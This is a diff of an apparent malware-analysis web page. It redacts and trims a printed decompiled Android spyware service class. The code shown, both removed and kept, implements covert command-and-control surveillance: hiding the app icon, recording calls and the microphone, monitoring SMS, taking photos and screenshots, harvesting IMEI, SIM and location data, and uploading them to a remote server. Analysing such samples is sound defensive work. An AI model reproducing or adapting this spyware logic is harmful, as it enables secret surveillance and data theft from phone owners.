@@ -218,77 +218,27 @@ LIST HERE
       Following the callback to the `CMDService` class, we can see the sample defines Command and Control (C2) capabilities as well as instantiates programmatic `IF/ELSE` conditional statement clauses for C2 flow prior to data exfiltration to the remote C2:</p>
 
     <pre class="hack dark"><i>
-public class com.example.appcode.appcode.CMDService extends android.app.Service implements android.media.AudioRecord$OnRecordPositionUpdateListener {
-  private static java.util.Timer timer;
-  private com.example.appcode.appcode.AudioStreamer audio;
-  private com.example.appcode.appcode.CallMonitor call;
-  private com.example.appcode.appcode.CallRecording callRec;
-  private android.content.Context ctx;
-  private com.example.appcode.appcode.SystemInfo info;
-  private android.content.Intent intent;
-  private org.json.JSONObject json;
-  private com.example.appcode.appcode.update newUp;
-  private android.telephony.PhoneStateListener p_listener;
-  private com.example.appcode.appcode.SMSMonitor sms;
-  private android.telephony.TelephonyManager t_manager;
-  private final android.os.Handler toastHandler;
-  public com.example.appcode.appcode.fileUpload upload;
-
-  static {
-    Maybe([ARRAY, OBJECT]) v2_0 = new java.util.Timer(v0_0);
-    Maybe([ARRAY, OBJECT]) v0_1 = v2_0;
-    v2_0.<init>();
-    com.example.appcode.appcode.CMDService.timer = v0_1;
-    return;
-  }
-
-  public constructor com.example.appcode.appcode.CMDService() {
-    Maybe([ARRAY, OBJECT]) v5_0 = new com.example.appcode.appcode.fileUpload(v2_0);
+  public constructor com.example.redacted.redacted.CMDService() {
+    Maybe([ARRAY, OBJECT]) v5_0 = new com.example.redacted.redacted.fileUpload(v2_0);
     Maybe([ARRAY, OBJECT]) v2_1 = v5_0;
     v5_0.<init>();
     this.upload = v2_1;
-    Maybe([ARRAY, OBJECT]) v5_1 = new com.example.appcode.appcode.update(v2_2);
+    Maybe([ARRAY, OBJECT]) v5_1 = new com.example.redacted.redacted.update(v2_2);
     Maybe([ARRAY, OBJECT]) v2_3 = v5_1;
     v5_1.<init>();
     this.newUp = v2_3;
-    Maybe([ARRAY, OBJECT]) v5_2 = new com.example.appcode.appcode.CMDService$2(v2_4);
+    Maybe([ARRAY, OBJECT]) v5_2 = new com.example.redacted.redacted.CMDService$2(v2_4);
     Maybe([ARRAY, OBJECT]) v2_5 = v5_2;
     v5_2.<init>(this);
     this.toastHandler = v2_5;
     return;
   }
 
-  static synthetic com.example.appcode.appcode.CallRecording access$000(com.example.appcode.appcode.CMDService p2) {
-    return p2.callRec;
-  }
-
-  static synthetic com.example.appcode.appcode.CallRecording access$002(com.example.appcode.appcode.CMDService p7, com.example.appcode.appcode.CallRecording p8) {
-    p7.callRec = p8;
-    return p8;
-  }
-
-  static synthetic android.os.Handler access$200(com.example.appcode.appcode.CMDService p2) {
-    return p2.toastHandler;
-  }
-
-  static synthetic boolean access$300(com.example.appcode.appcode.CMDService p2) {
-    return p2.isConnected();
-  }
-
-  static synthetic org.json.JSONObject access$400(com.example.appcode.appcode.CMDService p2) {
-    return p2.json;
-  }
-
-  static synthetic org.json.JSONObject access$402(com.example.appcode.appcode.CMDService p7, org.json.JSONObject p8) {
-    p7.json = p8;
-    return p8;
-  }
-
   private void callRecording() {
     try {
       if (this.callRec == null) {
         this.t_manager = ((android.telephony.TelephonyManager)this.getSystemService("phone"));
-        Maybe([ARRAY, OBJECT]) v6_0 = new com.example.appcode.appcode.CMDService$1(v3_3);
+        Maybe([ARRAY, OBJECT]) v6_0 = new com.example.redacted.redacted.CMDService$1(v3_3);
         Maybe([ARRAY, OBJECT]) v3_4 = v6_0;
         v6_0.<init>(this);
         this.p_listener = v3_4;
@@ -297,18 +247,6 @@ public class com.example.appcode.appcode.CMDService extends android.app.Service 
         this.callRec.stop();
       }
     } catch (Exception v2_2) {
-    }
-    return;
-  }
-
-  private void hideApp() {
-    try {
-      Maybe([ARRAY, OBJECT]) v1_0 = this.getPackageManager();
-      Maybe([ARRAY, OBJECT]) v7_0 = new android.content.ComponentName(v3_2);
-      Maybe([ARRAY, OBJECT]) v3_3 = v7_0;
-      v7_0.<init>(this, com.example.appcode.appcode.MainActivity.class);
-      v1_0.setComponentEnabledSetting(v3_3, 2, 1);
-    } catch (Exception v3_5) {
     }
     return;
   }
@@ -326,14 +264,14 @@ public class com.example.appcode.appcode.CMDService extends android.app.Service 
 
   private void micRecording() {
     try {
-      com.example.appcode.appcode.setting.setRecType(1);
+      com.example.redacted.redacted.setting.setRecType(1);
     } catch (Exception v2_3) {
       return;
     }
     if (this.audio != null) {
       this.audio.stop();
     }
-    Maybe([ARRAY, OBJECT]) v5_0 = new com.example.appcode.appcode.AudioStreamer(v3_0);
+    Maybe([ARRAY, OBJECT]) v5_0 = new com.example.redacted.redacted.AudioStreamer(v3_0);
     Maybe([ARRAY, OBJECT]) v3_1 = v5_0;
     v5_0.<init>();
     this.audio = v3_1;
@@ -354,9 +292,9 @@ public class com.example.appcode.appcode.CMDService extends android.app.Service 
       Maybe([ARRAY, OBJECT]) v2_3 = v7_1;
       v7_1.<init>();
       Maybe([ARRAY, OBJECT]) v1_0 = v2_3;
-      com.example.appcode.appcode.setting.os = this.info.androidInfo();
-      com.example.appcode.appcode.setting.ip = this.info.getIP();
-      com.example.appcode.appcode.setting.imi = this.info.getIMEI();
+      com.example.redacted.redacted.setting.os = this.info.androidInfo();
+      com.example.redacted.redacted.setting.ip = this.info.getIP();
+      com.example.redacted.redacted.setting.imi = this.info.getIMEI();
       v1_0.put("CMD", "info");
       v1_0.put("CountryCode", this.info.getCountryCode());
       v1_0.put("name", this.info.getOperatorName());
@@ -365,7 +303,7 @@ public class com.example.appcode.appcode.CMDService extends android.app.Service 
       v1_0.put("simSerial", this.info.getSimSerial());
     } catch (Exception v2_20) {
       Maybe([ARRAY, OBJECT]) v1_1 = v2_20;
-      if (com.example.appcode.appcode.setting.errors) {
+      if (com.example.redacted.redacted.setting.errors) {
         android.content.Context v2_23 = this.getBaseContext();
         Maybe([ARRAY, OBJECT]) v7_2 = new StringBuilder(v3_11);
         Maybe([ARRAY, OBJECT]) v3_12 = v7_2;
@@ -375,41 +313,41 @@ public class com.example.appcode.appcode.CMDService extends android.app.Service 
       Maybe([ARRAY, OBJECT]) v0_1 = 0;
       return v0_1;
     }
-    if (!com.example.appcode.appcode.setting.isNetworkEnabled) {
+    if (!com.example.redacted.redacted.setting.isNetworkEnabled) {
       v4_24 = "false";
     } else {
       v4_24 = "true";
     }
     String v4_26;
     v1_0.put("posnetwork", v4_24);
-    if (!com.example.appcode.appcode.setting.isGPSEnabled) {
+    if (!com.example.redacted.redacted.setting.isGPSEnabled) {
       v4_26 = "false";
     } else {
       v4_26 = "true";
     }
     String v4_28;
     v1_0.put("posgps", v4_26);
-    if (!com.example.appcode.appcode.setting.recMic) {
+    if (!com.example.redacted.redacted.setting.recMic) {
       v4_28 = "false";
     } else {
       v4_28 = "true";
     }
     String v4_30;
     v1_0.put("recMic", v4_28);
-    if (!com.example.appcode.appcode.setting.recCall) {
+    if (!com.example.redacted.redacted.setting.recCall) {
       v4_30 = "false";
     } else {
       v4_30 = "true";
     }
     v1_0.put("recCall", v4_30);
-    v1_0.put("smsMoniterUp", com.example.appcode.appcode.setting.smsMoniterUp);
-    v1_0.put("smsMoniterDw", com.example.appcode.appcode.setting.smsMoniterDw);
-    v1_0.put("smsWhere", com.example.appcode.appcode.setting.smsWhere);
-    v1_0.put("callMoniterUp", com.example.appcode.appcode.setting.callMoniterUp);
-    v1_0.put("callMoniterDw", com.example.appcode.appcode.setting.callMoniterDw);
-    v1_0.put("callWhere", com.example.appcode.appcode.setting.callWhere);
-    v1_0.put("capPath", com.example.appcode.appcode.setting.capPath);
-    v1_0.put("recPath", com.example.appcode.appcode.setting.recPath);
+    v1_0.put("smsMoniterUp", com.example.redacted.redacted.setting.smsMoniterUp);
+    v1_0.put("smsMoniterDw", com.example.redacted.redacted.setting.smsMoniterDw);
+    v1_0.put("smsWhere", com.example.redacted.redacted.setting.smsWhere);
+    v1_0.put("callMoniterUp", com.example.redacted.redacted.setting.callMoniterUp);
+    v1_0.put("callMoniterDw", com.example.redacted.redacted.setting.callMoniterDw);
+    v1_0.put("callWhere", com.example.redacted.redacted.setting.callWhere);
+    v1_0.put("capPath", com.example.redacted.redacted.setting.capPath);
+    v1_0.put("recPath", com.example.redacted.redacted.setting.recPath);
     v1_0.put("simSerial", this.info.getSimSerial());
     v1_0.put("health", this.info.health);
     v1_0.put("level", this.info.level);
@@ -421,7 +359,7 @@ public class com.example.appcode.appcode.CMDService extends android.app.Service 
     v1_0.put("temperature", this.info.temperature);
     v1_0.put("voltage", this.info.voltage);
     v1_0.put("dirpath", android.os.Environment.getExternalStorageDirectory());
-    v1_0.put("version", com.example.appcode.appcode.setting.verion);
+    v1_0.put("version", com.example.redacted.redacted.setting.verion);
     v1_0.put("network", this.info.networkInfo());
     v1_0.put("simOperatorCode", this.info.getSimOperatorCode());
     v1_0.put("CID", "0");
@@ -431,8 +369,8 @@ public class com.example.appcode.appcode.CMDService extends android.app.Service 
 
   private void startService() {
     try {
-      if (!com.example.appcode.appcode.setting.recMic) {
-        if (com.example.appcode.appcode.setting.recCall) {
+      if (!com.example.redacted.redacted.setting.recMic) {
+        if (com.example.redacted.redacted.setting.recCall) {
           this.callRecording();
         }
       } else {
@@ -440,16 +378,16 @@ public class com.example.appcode.appcode.CMDService extends android.app.Service 
       }
     } catch (Exception v2_1) {
     }
-    Maybe([ARRAY, OBJECT]) v8_0 = new com.example.appcode.appcode.CMDService$mainTask(v3_0);
+    Maybe([ARRAY, OBJECT]) v8_0 = new com.example.redacted.redacted.CMDService$mainTask(v3_0);
     Maybe([ARRAY, OBJECT]) v3_1 = v8_0;
     v8_0.<init>(this, 0);
-    com.example.appcode.appcode.CMDService.timer.scheduleAtFixedRate(v3_1, ((long)com.example.appcode.appcode.setting.timerDelay), ((long)com.example.appcode.appcode.setting.timerStart));
+    com.example.redacted.redacted.CMDService.timer.scheduleAtFixedRate(v3_1, ((long)com.example.redacted.redacted.setting.timerDelay), ((long)com.example.redacted.redacted.setting.timerStart));
     return;
   }
 
   private void stopMic() {
     try {
-      com.example.appcode.appcode.setting.recMic = 0;
+      com.example.redacted.redacted.setting.recMic = 0;
     } catch (Exception v2_3) {
       return;
     }
@@ -501,7 +439,7 @@ public class com.example.appcode.appcode.CMDService extends android.app.Service 
   public void onCreate() {
     super.onCreate();
     this.ctx = this;
-    Maybe([ARRAY, OBJECT]) v6_0 = new com.example.appcode.appcode.SystemInfo(v2_1);
+    Maybe([ARRAY, OBJECT]) v6_0 = new com.example.redacted.redacted.SystemInfo(v2_1);
     Maybe([ARRAY, OBJECT]) v2_2 = v6_0;
     v6_0.<init>(this.ctx);
     this.info = v2_2;
@@ -518,29 +456,21 @@ public class com.example.appcode.appcode.CMDService extends android.app.Service 
 
   public void onDestroy() {
     super.onDestroy();
-    if (com.example.appcode.appcode.setting.errors) {
+    if (com.example.redacted.redacted.setting.errors) {
       android.widget.Toast.makeText(this, "Service Stopped", 1).show();
     }
     return;
   }
 
-  public void onMarkerReached(android.media.AudioRecord recorder) {
-    return;
-  }
-
-  public void onPeriodicNotification(android.media.AudioRecord recorder) {
-    return;
-  }
-
   public int onStartCommand(android.content.Intent p10, int p11, int p12) {
-    Maybe([ARRAY, OBJECT]) v8_0 = new com.example.appcode.appcode.SystemInfo(v5_0);
+    Maybe([ARRAY, OBJECT]) v8_0 = new com.example.redacted.redacted.SystemInfo(v5_0);
     Maybe([ARRAY, OBJECT]) v5_1 = v8_0;
     v8_0.<init>(this.ctx);
     this.info = v5_1;
-    com.example.appcode.appcode.setting.os = this.info.androidInfo();
-    com.example.appcode.appcode.setting.ip = this.info.getIP();
-    com.example.appcode.appcode.setting.imi = this.info.getIMEI();
-    if (com.example.appcode.appcode.setting.errors) {
+    com.example.redacted.redacted.setting.os = this.info.androidInfo();
+    com.example.redacted.redacted.setting.ip = this.info.getIP();
+    com.example.redacted.redacted.setting.imi = this.info.getIMEI();
+    if (com.example.redacted.redacted.setting.errors) {
       android.widget.Toast.makeText(this, "Service Started", 1).show();
     }
     return 1;
@@ -554,7 +484,7 @@ public class com.example.appcode.appcode.CMDService extends android.app.Service 
       Maybe([ARRAY, OBJECT]) v2_0 = v5_1;
     } catch (Exception v5_4) {
       Maybe([ARRAY, OBJECT]) v2_1 = v5_4;
-      if (!com.example.appcode.appcode.setting.errors) {
+      if (!com.example.redacted.redacted.setting.errors) {
         return;
       } else {
         android.content.Context v5_7 = this.getBaseContext();
@@ -569,7 +499,7 @@ public class com.example.appcode.appcode.CMDService extends android.app.Service 
       return;
     } else {
       if (!v2_0.getJSONObject("header").getString("status").equals("true")) {
-        if (!com.example.appcode.appcode.setting.errors) {
+        if (!com.example.redacted.redacted.setting.errors) {
           return;
         } else {
           android.content.Context v5_37 = this.getBaseContext();
@@ -588,7 +518,7 @@ public class com.example.appcode.appcode.CMDService extends android.app.Service 
             v4_0 = v2_0.getJSONObject("header").getString("CID");
           }
           this.processCMD(v2_0.getJSONObject("header").getString("CMD"), v4_0, v2_0);
-          if (!com.example.appcode.appcode.setting.errors) {
+          if (!com.example.redacted.redacted.setting.errors) {
             return;
           } else {
             android.content.Context v5_33 = this.getBaseContext();
@@ -608,7 +538,7 @@ public class com.example.appcode.appcode.CMDService extends android.app.Service 
       Type(UNKNOWN) v6_0 = this.isConnected();
     } catch (Exception v21_264) {
       Maybe([ARRAY, OBJECT]) v6_1 = v21_264;
-      if (!com.example.appcode.appcode.setting.errors) {
+      if (!com.example.redacted.redacted.setting.errors) {
         return;
       } else {
         android.content.Context v21_267 = this.getBaseContext();
@@ -620,7 +550,7 @@ public class com.example.appcode.appcode.CMDService extends android.app.Service 
       }
     }
     if (v6_0 == null) {
-      if ((!com.example.appcode.appcode.setting.errors) || (v6_0 != null)) {
+      if ((!com.example.redacted.redacted.setting.errors) || (v6_0 != null)) {
         return;
       } else {
         android.widget.Toast.makeText(this.getBaseContext(), "No Internet", 1).show();
@@ -634,7 +564,7 @@ public class com.example.appcode.appcode.CMDService extends android.app.Service 
       if (p30.getJSONObject("header").has("VAL")) {
         p30.getJSONObject("header").getString("VAL");
       }
-      if (com.example.appcode.appcode.setting.errors) {
+      if (com.example.redacted.redacted.setting.errors) {
         android.content.Context v21_19 = this.getApplicationContext();
         Maybe([ARRAY, OBJECT]) v26_0 = new StringBuilder(v22_8);
         Maybe([ARRAY, OBJECT]) v22_9 = v26_0;
@@ -886,368 +816,10 @@ public class com.example.appcode.appcode.CMDService extends android.app.Service 
         }
       }
 
-      switch (v10_0) {
-        case 0: {
-          com.example.appcode.appcode.setting.recCall = 1;
-          com.example.appcode.appcode.setting.callWhere = v7_0;
-          com.example.appcode.appcode.setting.recCID = p29;
-          com.example.appcode.appcode.setting.recCMD = p28;
-          this.callRecording();
-          return;
-        }
-        case 1: {
-          this.stopRecording();
-          return;
-        }
-        case 2: {
-          com.example.appcode.appcode.setting.recMic = 1;
-          com.example.appcode.appcode.setting.setRecTime(v7_0);
-          this.micRecording();
-          return;
-        }
-        case 3: {
-          this.stopMic();
-          return;
-        }
-        case 4: {
-          if (this.call == null) {
-            return;
-          } else {
-            this.unregisterReceiver(this.call);
-            return;
-          }
-        }
-        case 5: {
-          com.example.appcode.appcode.setting.callMoniterUp = 1;
-          com.example.appcode.appcode.setting.callMoniterDw = 1;
-          com.example.appcode.appcode.setting.callWhere = v7_0;
-          com.example.appcode.appcode.setting.callCID = p29;
-          com.example.appcode.appcode.setting.callCMD = p28;
-          Maybe([ARRAY, OBJECT]) v26_30 = new com.example.appcode.appcode.CallMonitor(v22_137);
-          Maybe([ARRAY, OBJECT]) v22_138 = v26_30;
-          v26_30.<init>();
-          this.call = v22_138;
-          return;
-        }
-        case 6: {
-          com.example.appcode.appcode.setting.callMoniterUp = 1;
-          com.example.appcode.appcode.setting.callMoniterDw = 0;
-          com.example.appcode.appcode.setting.callWhere = v7_0;
-          com.example.appcode.appcode.setting.callCID = p29;
-          com.example.appcode.appcode.setting.callCMD = p28;
-          Maybe([ARRAY, OBJECT]) v26_29 = new com.example.appcode.appcode.CallMonitor(v22_135);
-          Maybe([ARRAY, OBJECT]) v22_136 = v26_29;
-          v26_29.<init>();
-          this.call = v22_136;
-          return;
-        }
-        case 7: {
-          com.example.appcode.appcode.setting.callMoniterUp = 0;
-          com.example.appcode.appcode.setting.callMoniterDw = 1;
-          com.example.appcode.appcode.setting.callWhere = v7_0;
-          com.example.appcode.appcode.setting.callCID = p29;
-          com.example.appcode.appcode.setting.callCMD = p28;
-          Maybe([ARRAY, OBJECT]) v26_28 = new com.example.appcode.appcode.CallMonitor(v22_133);
-          Maybe([ARRAY, OBJECT]) v22_134 = v26_28;
-          v26_28.<init>();
-          this.call = v22_134;
-          return;
-        }
-        case 8: {
-          if (this.sms == null) {
-            return;
-          } else {
-            this.unregisterReceiver(this.sms);
-            return;
-          }
-        }
-        case 9: {
-          com.example.appcode.appcode.setting.smsMoniterUp = 1;
-          com.example.appcode.appcode.setting.smsMoniterDw = 1;
-          com.example.appcode.appcode.setting.smsWhere = v7_0;
-          com.example.appcode.appcode.setting.smsCID = p29;
-          com.example.appcode.appcode.setting.smsCMD = p28;
-          Maybe([ARRAY, OBJECT]) v26_27 = new com.example.appcode.appcode.SMSMonitor(v22_129);
-          Maybe([ARRAY, OBJECT]) v22_130 = v26_27;
-          v26_27.<init>();
-          this.sms = v22_130;
-          return;
-        }
-        case 10: {
-          com.example.appcode.appcode.setting.smsMoniterUp = 1;
-          com.example.appcode.appcode.setting.smsMoniterDw = 0;
-          com.example.appcode.appcode.setting.smsWhere = v7_0;
-          com.example.appcode.appcode.setting.smsCID = p29;
-          com.example.appcode.appcode.setting.smsCMD = p28;
-          Maybe([ARRAY, OBJECT]) v26_26 = new com.example.appcode.appcode.SMSMonitor(v22_127);
-          Maybe([ARRAY, OBJECT]) v22_128 = v26_26;
-          v26_26.<init>();
-          this.sms = v22_128;
-          return;
-        }
-        case 11: {
-          com.example.appcode.appcode.setting.smsMoniterUp = 0;
-          com.example.appcode.appcode.setting.smsMoniterDw = 1;
-          com.example.appcode.appcode.setting.smsWhere = v7_0;
-          com.example.appcode.appcode.setting.smsCID = p29;
-          com.example.appcode.appcode.setting.smsCMD = p28;
-          Maybe([ARRAY, OBJECT]) v26_25 = new com.example.appcode.appcode.SMSMonitor(v22_125);
-          Maybe([ARRAY, OBJECT]) v22_126 = v26_25;
-          v26_25.<init>();
-          this.sms = v22_126;
-          return;
-        }
-        case 12: {
-          Maybe([ARRAY, OBJECT]) v26_24 = new com.example.appcode.appcode.ScreenShot(v21_205);
-          Maybe([ARRAY, OBJECT]) v21_206 = v26_24;
-          v26_24.<init>();
-          Maybe([ARRAY, OBJECT]) v11_0 = v21_206;
-          v11_0.jObj = p30;
-          v11_0.CID = p29;
-          v11_0.CMD = this;
-          v11_0.take();
-          return;
-        }
-        case 13: {
-          Maybe([ARRAY, OBJECT]) v26_22 = new com.example.appcode.appcode.fileDownload(v21_200);
-          Maybe([ARRAY, OBJECT]) v21_201 = v26_22;
-          v26_22.<init>();
-          Maybe([ARRAY, OBJECT]) v12_0 = v21_201;
-          v12_0.CMD = this;
-          v12_0.CID = p29;
-          Maybe([ARRAY, OBJECT]) v21_204 = v12_0;
-          Maybe([ARRAY, OBJECT]) v26_23 = new org.json.JSONObject[1];
-          Maybe([ARRAY, OBJECT]) v22_120 = v26_23;
-          v26_23[0] = p30;
-          v21_204.execute(v22_120);
-          return;
-        }
-        case 14: {
-          Maybe([ARRAY, OBJECT]) v26_19 = new com.example.appcode.appcode.SMSLister(v21_191);
-          Maybe([ARRAY, OBJECT]) v21_192 = v26_19;
-          v26_19.<init>();
-          this.json = v21_192.listSMS(this, v7_0);
-          this.json.put("CID", p29);
-          this.json.put("CMD", p28);
-          Maybe([ARRAY, OBJECT]) v26_20 = new com.example.appcode.appcode.CMDService$HttpAsyncTask(v21_198);
-          Maybe([ARRAY, OBJECT]) v21_199 = v26_20;
-          v26_20.<init>(this);
-          Maybe([ARRAY, OBJECT]) v26_21 = new org.json.JSONObject[1];
-          Maybe([ARRAY, OBJECT]) v22_114 = v26_21;
-          v26_21[0] = this.json;
-          v21_199.execute(v22_114);
-          return;
-        }
-        case 15: {
-          this.json.put("CMD", "ping");
-          Maybe([ARRAY, OBJECT]) v26_17 = new com.example.appcode.appcode.CMDService$HttpAsyncTask(v21_189);
-          Maybe([ARRAY, OBJECT]) v21_190 = v26_17;
-          v26_17.<init>(this);
-          Maybe([ARRAY, OBJECT]) v26_18 = new org.json.JSONObject[1];
-          Maybe([ARRAY, OBJECT]) v22_105 = v26_18;
-          v26_18[0] = this.json;
-          v21_190.execute(v22_105);
-          return;
-        }
-        case 16: {
-          this.json = this.putInfo();
-          Maybe([ARRAY, OBJECT]) v26_15 = new com.example.appcode.appcode.CMDService$HttpAsyncTask(v21_185);
-          Maybe([ARRAY, OBJECT]) v21_186 = v26_15;
-          v26_15.<init>(this);
-          Maybe([ARRAY, OBJECT]) v26_16 = new org.json.JSONObject[1];
-          Maybe([ARRAY, OBJECT]) v22_100 = v26_16;
-          v26_16[0] = this.json;
-          v21_186.execute(v22_100);
-          return;
-        }
-        case 17: {
-          this.newUp.updateSetting(p30);
-          return;
-        }
-        case 18: {
-          this.newUp.updateApp(this.getApplicationContext(), v7_0);
-          return;
-        }
-        case 19: {
-          Maybe([ARRAY, OBJECT]) v26_14 = new com.example.appcode.appcode.DirLister(v21_177);
-          Maybe([ARRAY, OBJECT]) v21_178 = v26_14;
-          v26_14.<init>();
-          v21_178.deleteFile(v7_0);
-          return;
-        }
-        case 20: {
-          this.upload.uploadToServer(p30);
-          return;
-        }
-        case 21: {
-          Maybe([ARRAY, OBJECT]) v26_13 = new com.example.appcode.appcode.PhotoTaker(v21_172);
-          Maybe([ARRAY, OBJECT]) v21_173 = v26_13;
-          v26_13.<init>(this, p30);
-          v21_173.backCam();
-          return;
-        }
-        case 22: {
-          Maybe([ARRAY, OBJECT]) v26_12 = new com.example.appcode.appcode.PhotoTaker(v21_169);
-          Maybe([ARRAY, OBJECT]) v21_170 = v26_12;
-          v26_12.<init>(this, p30);
-          v21_170.frontCam();
-          return;
-        }
-        case 23: {
-          Maybe([ARRAY, OBJECT]) v26_9 = new com.example.appcode.appcode.CallLogLister(v21_160);
-          Maybe([ARRAY, OBJECT]) v21_161 = v26_9;
-          v26_9.<init>();
-          this.json = v21_161.listCallLog(this, v7_0);
-          this.json.put("CID", p29);
-          this.json.put("CMD", p28);
-          Maybe([ARRAY, OBJECT]) v26_10 = new com.example.appcode.appcode.CMDService$HttpAsyncTask(v21_167);
-          Maybe([ARRAY, OBJECT]) v21_168 = v26_10;
-          v26_10.<init>(this);
-          Maybe([ARRAY, OBJECT]) v26_11 = new org.json.JSONObject[1];
-          Maybe([ARRAY, OBJECT]) v22_86 = v26_11;
-          v26_11[0] = this.json;
-          v21_168.execute(v22_86);
-          return;
-        }
-        case 24: {
-          Maybe([ARRAY, OBJECT]) v26_6 = new com.example.appcode.appcode.ContactsLister(v21_151);
-          Maybe([ARRAY, OBJECT]) v21_152 = v26_6;
-          v26_6.<init>();
-          this.json = v21_152.listContacts(this, v7_0);
-          this.json.put("CID", p29);
-          this.json.put("CMD", p28);
-          Maybe([ARRAY, OBJECT]) v26_7 = new com.example.appcode.appcode.CMDService$HttpAsyncTask(v21_158);
-          Maybe([ARRAY, OBJECT]) v21_159 = v26_7;
-          v26_7.<init>(this);
-          Maybe([ARRAY, OBJECT]) v26_8 = new org.json.JSONObject[1];
-          Maybe([ARRAY, OBJECT]) v22_77 = v26_8;
-          v26_8[0] = this.json;
-          v21_159.execute(v22_77);
-          return;
-        }
-        case 25: {
-          Maybe([ARRAY, OBJECT]) v26_3 = new com.example.appcode.appcode.DirLister(v21_142);
-          Maybe([ARRAY, OBJECT]) v21_143 = v26_3;
-          v26_3.<init>();
-          this.json = v21_143.listDir(this, v7_0);
-          this.json.put("CID", p29);
-          this.json.put("CMD", p28);
-          Maybe([ARRAY, OBJECT]) v26_4 = new com.example.appcode.appcode.CMDService$HttpAsyncTask(v21_149);
-          Maybe([ARRAY, OBJECT]) v21_150 = v26_4;
-          v26_4.<init>(this);
-          Maybe([ARRAY, OBJECT]) v26_5 = new org.json.JSONObject[1];
-          Maybe([ARRAY, OBJECT]) v22_68 = v26_5;
-          v26_5[0] = this.json;
-          v21_150.execute(v22_68);
-          return;
-        }
-        case 26: {
-          this.vibrate(v7_0, p29);
-          return;
-        }
-        case 27: {
-          this.showToast(p30, p29);
-          return;
-        }
-        case 28: {
-          this.gaveCall(p30, p29);
-          return;
-        }
-        case 29: {
-          Maybe([ARRAY, OBJECT]) v26_2 = new com.example.appcode.appcode.sendMessage(v21_133);
-          Maybe([ARRAY, OBJECT]) v21_134 = v26_2;
-          v26_2.<init>();
-          if (!v21_134.sendSMS(p30, p29)) {
-            this.updateStatus(p29, "-1");
-            return;
-          } else {
-            this.updateStatus(p29, "3");
-            return;
-          }
-        }
-        case 30: {
-          this.sendLocStatus(p29, p28);
-          return;
-        }
-        case 31: {
-          this.sendLocNetwork(p29, p28);
-          return;
-        }
-        case 32: {
-          this.sendLocGPS(p29, p28);
-          return;
-        }
-        case 33: {
-          this.sendProcess(p29, p28);
-          return;
-        }
-        default: {
-          return;
-        }
-      }
-
-    }
-  }
-
-  public void sendLocGPS(String p13, String p14) {
-    try {
-      String v8_3;
-      Maybe([ARRAY, OBJECT]) v11_0 = new com.example.appcode.appcode.GPSListener(v6_0);
-      Maybe([ARRAY, OBJECT]) v6_1 = v11_0;
-      v11_0.<init>(this.ctx);
-      Maybe([ARRAY, OBJECT]) v3_0 = v6_1;
-      v3_0.getStatus();
-      Maybe([ARRAY, OBJECT]) v11_1 = new org.json.JSONObject(v6_3);
-      Maybe([ARRAY, OBJECT]) v6_4 = v11_1;
-      v11_1.<init>();
-      Maybe([ARRAY, OBJECT]) v4_0 = v6_4;
-      Maybe([ARRAY, OBJECT]) v11_2 = new org.json.JSONArray(v6_5);
-      Maybe([ARRAY, OBJECT]) v6_6 = v11_2;
-      v11_2.<init>();
-      Maybe([ARRAY, OBJECT]) v5_0 = v6_6;
-    } catch (org.json.JSONException v6_8) {
-      v6_8.printStackTrace();
-      return;
-    }
-    if (!com.example.appcode.appcode.setting.isNetworkEnabled) {
-      v8_3 = "false";
-    } else {
-      v8_3 = "true";
-    }
-    String v8_5;
-    v4_0.put("posnetwork", v8_3);
-    if (!com.example.appcode.appcode.setting.isGPSEnabled) {
-      v8_5 = "false";
-    } else {
-      v8_5 = "true";
-    }
-    v4_0.put("posgps", v8_5);
-    v4_0.put("date", com.example.appcode.appcode.setting.getDate(java.util.Calendar.getInstance().getTimeInMillis()));
-    v3_0.getLocByGPS();
-    v4_0.put("lat", v3_0.getLatitude());
-    v4_0.put("lon", v3_0.getLongitude());
-    v5_0.put(v4_0);
-    Maybe([ARRAY, OBJECT]) v11_3 = new org.json.JSONObject(v7_9);
-    Maybe([ARRAY, OBJECT]) v7_10 = v11_3;
-    v11_3.<init>();
-    this.json = v7_10;
-    this.json.put("CID", p13);
-    this.json.put("CMD", p14);
-    this.json.put("userdata", v5_0);
-    Maybe([ARRAY, OBJECT]) v11_4 = new com.example.appcode.appcode.CMDService$HttpAsyncTask(v6_23);
-    Maybe([ARRAY, OBJECT]) v6_24 = v11_4;
-    v11_4.<init>(this);
-    Maybe([ARRAY, OBJECT]) v11_5 = new org.json.JSONObject[1];
-    Maybe([ARRAY, OBJECT]) v7_17 = v11_5;
-    v11_5[0] = this.json;
-    v6_24.execute(v7_17);
-    return;
-  }
-
   public void sendLocNetwork(String p13, String p14) {
     try {
       String v8_3;
-      Maybe([ARRAY, OBJECT]) v11_0 = new com.example.appcode.appcode.GPSListener(v6_0);
+      Maybe([ARRAY, OBJECT]) v11_0 = new com.example.redacted.redacted.GPSListener(v6_0);
       Maybe([ARRAY, OBJECT]) v6_1 = v11_0;
       v11_0.<init>(this.ctx);
       Maybe([ARRAY, OBJECT]) v3_0 = v6_1;
@@ -1264,188 +836,6 @@ public class com.example.appcode.appcode.CMDService extends android.app.Service 
       v6_8.printStackTrace();
       return;
     }
-    if (!com.example.appcode.appcode.setting.isNetworkEnabled) {
-      v8_3 = "false";
-    } else {
-      v8_3 = "true";
-    }
-    String v8_5;
-    v4_0.put("posnetwork", v8_3);
-    if (!com.example.appcode.appcode.setting.isGPSEnabled) {
-      v8_5 = "false";
-    } else {
-      v8_5 = "true";
-    }
-    v4_0.put("posgps", v8_5);
-    v4_0.put("date", com.example.appcode.appcode.setting.getDate(java.util.Calendar.getInstance().getTimeInMillis()));
-    v3_0.getLocByNetwork();
-    v4_0.put("lat", v3_0.getLatitude());
-    v4_0.put("lon", v3_0.getLongitude());
-    v5_0.put(v4_0);
-    Maybe([ARRAY, OBJECT]) v11_3 = new org.json.JSONObject(v7_9);
-    Maybe([ARRAY, OBJECT]) v7_10 = v11_3;
-    v11_3.<init>();
-    this.json = v7_10;
-    this.json.put("CID", p13);
-    this.json.put("CMD", p14);
-    this.json.put("userdata", v5_0);
-    Maybe([ARRAY, OBJECT]) v11_4 = new com.example.appcode.appcode.CMDService$HttpAsyncTask(v6_23);
-    Maybe([ARRAY, OBJECT]) v6_24 = v11_4;
-    v11_4.<init>(this);
-    Maybe([ARRAY, OBJECT]) v11_5 = new org.json.JSONObject[1];
-    Maybe([ARRAY, OBJECT]) v7_17 = v11_5;
-    v11_5[0] = this.json;
-    v6_24.execute(v7_17);
-    return;
-  }
-
-  public void sendLocStatus(String p13, String p14) {
-    try {
-      String v8_3;
-      Maybe([ARRAY, OBJECT]) v11_0 = new com.example.appcode.appcode.GPSListener(v6_0);
-      Maybe([ARRAY, OBJECT]) v6_1 = v11_0;
